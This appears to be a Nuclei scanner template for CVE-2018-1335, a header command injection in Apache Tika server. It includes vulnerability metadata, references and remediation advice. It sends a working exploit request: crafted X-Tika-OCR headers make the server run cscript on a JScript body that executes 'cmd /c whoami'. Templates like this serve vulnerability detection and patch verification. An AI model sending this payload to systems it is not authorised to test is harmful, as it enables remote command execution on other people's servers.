http:
- body: var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec("cmd
    /c whoami");
  headers:
    Connection: close
    Content-type: image/jp2
    Expect: 100-continue
    X-Tika-OCRLanguage: //E:Jscript
    X-Tika-OCRTesseractPath: cscript
  matchers:
  - part: header
    type: word
    words:
    - 'Content-Type: text/csv'
  - condition: and
    part: body
    type: word
    words:
    - org.apache.tika.parser.DefaultParser
    - org.apache.tika.parser.gdal.GDALParse
  - status:
    - 200
    type: status
  matchers-condition: and
  method: PUT
  path:
  - '{{BaseURL}}/meta'
id: CVE-2018-1335
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:apache:tika:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-1335
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    epss-percentile: 0.99813
    epss-score: 0.93516
  description: Apache Tika versions 1.7 to 1.17 allow clients to send carefully crafted
    headers to tika-server that could be used to inject commands into the command
    line of the server running tika-server. This vulnerability only affects those
    running tika-server on a server that is open to untrusted clients.
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands on the affected server.

    '
  metadata:
    max-request: 1
    product: tika
    vendor: apache
  name: Apache Tika < 1.1.8 - Header Command Injection
  reference:
  - https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
  - https://www.exploit-db.com/exploits/47208
  - https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1335
  - http://packetstormsecurity.com/files/153864/Apache-Tika-1.17-Header-Command-Injection.html
  remediation: Upgrade to Tika 1.18.
  severity: high
  tags: cve,cve2018,packetstorm,edb,apache,tika,rce,intrusive,vkev,vuln
